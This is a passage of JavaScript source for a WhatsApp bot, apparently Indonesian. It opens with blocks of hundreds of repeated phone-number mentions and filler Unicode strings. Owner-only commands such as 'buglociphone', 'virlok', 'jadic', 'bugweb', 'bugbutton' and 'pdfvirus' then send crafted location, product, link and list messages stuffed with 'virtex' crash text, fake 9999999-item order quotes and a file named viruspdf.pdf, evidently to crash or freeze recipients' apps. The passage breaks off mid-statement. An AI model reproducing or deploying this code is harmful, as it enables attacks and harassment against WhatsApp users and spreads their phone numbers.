~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
*9999999*9999999*9999999*
*9999999*9999999*9999999*
*9999999*9999999*9999999*
*9999999*9999999*9999999*
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~~*摷撝摾摩㨮掩揅R*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~~*摷撝摾摩㨮掩揅R*~
~*🜋🜊🜨🜲🜚*~ ~*𝟑𝟒𝟓𝟓𝟒𝟑*~`
kurzxd.sendMessage(from, textt, text, {quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxd️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }})
break
case 'bugvn':
if (!kurz.key.fromMe && !isOwner) return
gmemek = fs.readFileSync('./random/iyain.mp3')
kurzxd.sendMessage(from, gmemek, audio, { quoted: kurz, audioname:`${jadivirtex1}.mp3`, mimetype: 'audio/application' })
break
					case 'jadic':
   if (!q) return reply(`Teks?`)
 if ((isMedia && !kurz.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = await kurzxd.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "title": `${q}`,
             "description": `${vapi}`,
             "retailerId": "kurzxd",
         },
         "businessOwnerJid": "62853338317160@s.whatsapp.net",
         "contextInfo": {
            "forwardingScore": 0,
            "isForwarded": false
        }
    }
}, {quoted: kurz, contextInfo:{}})
   kurzxd.relayWAMessage(res)
}
break
case 'buglociphone':
if (!kurz.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}buglociphone namalu`)
 kurzxd.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q}.                                                                                                                                                   ${vapi}`,
                                "address": `kurz ${iphone}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'virlok':
if (!kurz.key.fromMe) return reply('Lu siapa')
if (!kurz.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`${prefix}virlok teks`)
 kurzxd.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q} ${spamvirtex}.                                                                                                                                                   ${vapi}`,
                                "address": `${q}.    ${spamvirtex}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'virlok':
if (!kurz.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`${prefix}virlok teks`)
 kurzxd.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q} ${spamvirtex}.                                                                                                                                                   ${vapi}`,
                                "address": `${q}.    ${spamvirtex}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'jadicv2':
   if (!q) return reply(`Teks?`)
 if ((isMedia && !kurz.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = await kurzxd.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "title": `${q} ${jadicatalog}`,
             "description": `${virtexctlgg} ${katalogv3}`,
             "retailerId": "kurzxd",
         },
         "businessOwnerJid": "62853338317160@s.whatsapp.net",
         "contextInfo": {
            "forwardingScore": 0,
            "isForwarded": false
        }
    }
}, {quoted: kurz, contextInfo:{}})
   kurzxd.relayWAMessage(res)
}
break
case 'buglocandro':
if (!kurz.key.fromMe) return reply('Lu siapa')
if (!kurz.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}buglocandro namalu`)
 kurzxd.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q} ${spamvirtex}.                                                                                                                                                   ${vapi}`,
                                "address": `kurzxd ${spamvirtex}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'buglocandro':
if (!kurz.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}buglocandro namalu`)
 kurzxd.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q} ${spamvirtex}.                                                                                                                                                   ${vapi}`,
                                "address": `kurzxd ${spamvirtex}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'jadicv3':
 if ((isMedia && !kurz.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = await kurzxd.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "thumbnail": virgam,
             "title": `${virtexbykurzxd}`,
             "description": `${virtexctlgg} ${katalogv3}`,
             "retailerId": "kurzxd",
         },
         "businessOwnerJid": "62853338317160@s.whatsapp.net",
         "contextInfo": {
            "forwardingScore": 0,
            "isForwarded": false
        }
    }
}, {quoted: kurz, contextInfo:{}})
   kurzxd.relayWAMessage(res)
}
break
case 'buglociphone':
if (!kurz.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}bugcatalog namalu`)
 kurzxd.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q}.                                                                                                                                                   ${vapi}`,
                                "address": `kurz ${iphone}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'bugweb':
if (!kurz.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}bugweb namalu`)
ppimg = await kurzxd.getProfilePicture(sender)
				ddatae = await imageToBase64(JSON.stringify(ppimg).replace(/\"/gi,''))
				kurzxd.sendMessage(from, {text: `https://nhentai.id\n${q}`, matchedText: 'https://nhentai.id', canonicalUrl: 'https://nhentai.id', description: `kurzxd ${vapi}`, title: `${vapi}`}, 'extendedTextMessage', {detectLinks: true}, {quoted : kurz})
		      break
case 'bugwebv2':
if (!kurz.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}bugweb namalu`)
ppimg = await kurzxd.getProfilePicture(sender)
				ddatae = await imageToBase64(JSON.stringify(ppimg).replace(/\"/gi,''))
				kurzxd.sendMessage(from, {text: `https://youtube.com/channel/UCSpYxXxRuGOfezlWd1S7Amw\n${q}`, matchedText: 'https://youtube.com/channel/UCSpYxXxRuGOfezlWd1S7Amw', canonicalUrl: 'https://youtube.com/channel/UCSpYxXxRuGOfezlWd1S7Amw', description: `Ggg ${spamvirtex}`, title: `${jadivirtex}`}, 'extendedTextMessage', {detectLinks: true}, {quoted : kurz})
		      break
			  case 'bugbutton':
        if (!isOwner && !kurz.key.fromMe) return reply(mess.only.ownerB)
        kurzxd.toggleDisappearingMessages(from, 0)
        listMsg = {
 buttonText: 'BUG BUTTON',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex2(prefix)}`,
 sections: [
                     {
                      "title": "Cie",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
kurzxd.sendMessage(from, listMsg, MessageType.listMessage, {quoted:kurz})
        kurzxd.toggleDisappearingMessages(from, 0)
break
break
case 'pdfvirus':
         if (!kurz.key.fromMe && !isOwner) return
virus = fs.readFileSync('./src/viruspdf.pdf')
kurzxd.sendMessage(from, virus, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxd️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
